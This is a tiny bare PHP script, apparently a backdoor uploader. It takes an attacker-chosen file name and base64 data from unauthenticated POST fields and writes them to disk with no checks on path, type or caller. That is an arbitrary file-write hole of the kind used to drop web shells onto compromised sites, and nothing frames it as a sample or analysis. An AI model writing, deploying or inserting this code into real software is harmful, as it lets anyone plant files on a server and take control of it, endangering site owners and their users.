<?php


$name = ($_POST['iname']);
file_put_contents($name, base64_decode($_POST['data']));